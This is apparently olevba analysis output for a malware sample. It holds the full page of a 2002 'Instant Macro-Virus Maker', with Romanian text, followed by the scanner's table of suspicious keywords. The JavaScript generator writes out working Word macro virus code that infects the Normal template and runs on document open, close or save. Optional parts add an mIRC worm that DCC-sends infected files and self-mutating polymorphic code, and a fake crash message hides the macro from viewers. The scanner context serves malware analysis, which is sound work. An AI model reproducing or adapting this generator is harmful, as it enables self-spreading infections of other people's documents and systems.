olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IMVM
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.IMVM 
in file: Virus.MSWord.IMVM - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<html>
<!--  CopyPasteRight (CPR) 2002 by MI_pirat -->
<!--         http://www.virii.s5.com         -->
<head>
  <title>Instant Macro-Virus Maker (IMVM)</title>
  <style type="text/css">
TEXTAREA,INPUT {
        color:c0c0c0;
	background-color:000000;
	font-weight:bold;	}
SELECT {
color:c0c0c0;
background-color:000000;
font-weight:bold;
}   
   A:hover { color:FFF000; text-decoration:underline }
   A:link {text-decoration: none;}
   A:visited {text-decoration: none;}
</style>
</head>
<BODY bgcolor="#000000" text="#FFCC00" link="#808080" vlink="#FF99CC">
<!-- JScript by MI_pirat & help form CoffeeCup, probably the best editor in this Word! -->
<!-- Lamerii probabil nu vor intzelege mare lucru din chestia de mai jos. Asta e scopul!!! -->
<SCRIPT LANGUAGE=JavaScript>
function scrie() {
dr="\r\n"
q='"'
j="_"
document.VG.surce.value="'Module Name: "+document.VG.nume.value+dr+"'***Generated with: IMVM by MI_pirat***"+dr+"'Copiaza codul urmator in modulul cu acelasi nume 'ca virusul:"+dr+dr
if (document.VG.Auto.value == 0) document.VG.surce.value=document.VG.surce.value+ "Sub AutoOpen()"
if (document.VG.Auto.value == 1) document.VG.surce.value=document.VG.surce.value+ "Sub AutoClose()"
if (document.VG.Auto.value == 2) document.VG.surce.value=document.VG.surce.value+ "Sub AutoSave()"
document.VG.surce.value=document.VG.surce.value+
dr+document.VG.q.value+"The "+document.VG.nume.value+" VIRUS"+"\r\n"+document.VG.q.value+"by "+document.VG.autor.value+dr+
"On Error Resume Next"+dr+"If Application.UserName <> "+q+document.VG.nume.value+q+" Then"+
dr+"Set mytemplate = NormalTemplate"+
dr+"Application.OrganizerCopy Source:= "+j+
dr+"ActiveDocument.FullName, Destination:= "+j+
dr+"mytemplate.FullName, Name:= "+j+
dr+q+document.VG.nume.value+q+" , Object:=wdOrganizerObjectProjectItems"+
dr+"Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _"+
dr+":=False, AddToRecentFiles:=False, PasswordDocument:="+q+q+", PasswordTemplate _"+
dr+":="+q+q+", Revert:=False, WritePasswordDocument:="+q+q+", WritePasswordTemplate:="+q+q+" _"+
dr+", Format:=wdOpenFormatAuto"+
dr+"ActiveDocument.Save"+
dr+"ActiveDocument.Close"+
dr+"Application.UserName = "+q+document.VG.nume.value+q+
dr+"End If"+dr+"For Each aVar In ActiveDocument.Variables"+
dr+"If aVar.Name = "+q+"Inf"+q+" Then num = aVar.Index"+
dr+"Next aVar"+dr+"If num = 0 Then"+
dr+"ActiveDocument.Variables.Add Name:="+q+"Inf"+q+
dr+"Set mytemplate = ActiveDocument.AttachedTemplate"+
dr+"Application.OrganizerCopy Source:= "+j+
dr+"mytemplate.FullName, Destination:= "+j+
dr+"ActiveDocument.FullName, Name:= "+j+
dr+q+document.VG.nume.value+q+", Object:=wdOrganizerObjectProjectItems"+
dr+"ActiveDocument.Save"+dr+"End If"+
dr+"zi = Day(Date)"+
dr+"If zi = "+document.VG.data.value+" Then MsgBox "+q+document.VG.txt.value+q+dr
if (document.VG.iworm.checked == 1) 
{
document.VG.surce.value=document.VG.surce.value+
"bkup = ActiveDocument.FullName"+
dr+"scr = "+q+"C:\\"+q+" + Chr(Int((25 * Rnd) + 65)) + "+q+".doc"+q+
dr+"ActiveDocument.SaveAs scr"+
dr+"ActiveDocument.SaveAs bkup"+
dr+ "strip = "+"System.PrivateProfileString("+q+q+","+q+
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Uninstall\mIRC\\"+q+
", "+q+"UninstallString"+q+")"+
dr+"strip = Mid(strip, 2, Len(strip) - 23)"+
dr+"Open strip + "+q+"script.ini"+q+" For Output As #1"+
dr+"Print #1, "+q+"[Script]"+q+
dr+"Print #1, "+q+"n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"+q+
dr+"Print #1, "+q+"n1=/dcc send $nick "+q+"scr"+
dr+"Print #1, "+q+"n2=}"+
dr+"Close #1"+dr
}
if (document.VG.poly.checked == 1) 
{
document.VG.surce.value=document.VG.surce.value+
"Set char1 = ActiveDocument.VBProject"+
dr+"Set char2 = char1.VBComponents(1).CodeModule"+
dr+"For ik = 2 To char2.CountOfLines"+
dr+"nam1 = char2.Lines(ik, 1)"+
dr+"If Len(nam1) <= 100 Then"+
dr+"nam1 = nam1 + "+q+document.VG.q.value+q+" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))"+
dr+"char2.ReplaceLine ik, nam1"+
dr+"End If"+
dr+"Next ik"+
dr+"ActiveDocument.Save"+dr
}

document.VG.surce.value=document.VG.surce.value+"End Sub"+dr+
"Sub ViewVBCode()"+
dr+"On Error Resume Next"+
dr+"MsgBox "+q+"WinWord Fatal error !"+q+", vbCritical, "+q+"Error at 453654[ecx]:9045{vxd}"+q+dr+"Application.Quit (False)"+
dr+"End Sub"

}
</SCRIPT>
<h2><center><font color="909090">The Instant Macro-Virus Maker (IMVM) v1.3</center></h2></font>
<font color="red"><h5>Nu intelegeti gresit! Eu *NU* incurajez crearea de virusi(distructivi) ci doar sustin pe cei care o fac. Toate sursele mele contin payload-uri nedistructive (funny), dar e la atitudinea fiecaruia sa faca ce vrea cu ele! Nu imi asum nici o raspundere pentru faptele altora, fiecare e raspunzator pentru ceea ce face.</h5></font>
<b>Acesta este primul generator de macro-virusi online. A fost destul de mediatizat in ultima vreme pe diferite site-uri AV de pe NET, motiv pt. care a trebuit sa-mi si mut site-ul pe alt host!
<br>FARA DOWNLOAD, FARA TIMP PIERDUT AIUREA, FARA SA STI PROGRAMARE!!!
<br>Trebuie doar sa alegi din variante si apoi cu copy/paste sa copiezi codul intr-un modul de Word (97..2000 etc.).Enjoy !</B>
<img src="atom.jpg" width="300" height="300" alt="AtOmIc PoWeR" border="0" align="right">
<p>
<FORM name="VG" enctype="text/plain">
<br>Numele virusului:
<br><input type="text" name="nume" value="Nume">
<br>Numele autorului:
<br><input type="text" name="autor" value="Numele autorului">
<br>Macro folosit:
<br><SELECT NAME="Auto" list-style-type: disc; border-style: solid; border-color: #000000 size="1" tabindex="1">
<OPTION VALUE="0" SELECTED>AutoOpen
<OPTION VALUE="1">AutoClose
<OPTION VALUE="2">AutoSave</SELECT>
<br><input type="checkbox" name="iworm" value="worm">I-Worm <input type="checkbox" name="poly" value="poly">Polymorphic
<br>Text de afisat:
<br><input type="text" name="txt" value="Un text de afisat">
<br>Data in care afiseaza textul (intre 1 si 31):
<br><input type="text" name="data" value="00">
<input type="hidden" name="q" value="'">
<p><input value="Genereaza" type="BUTTON" onClick="scrie()">
<p><b>Sursa finala:</B>
<br><textarea name="surce" rows="10" cols="50" ></textarea>
</form>
<p><a href="index.htm">Back</a>
<h3><center>by MI_pirat</center></h3>
</BODY>
</html>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.s5.|URL                                          |
|          |com                 |                                             |
+----------+--------------------+---------------------------------------------+

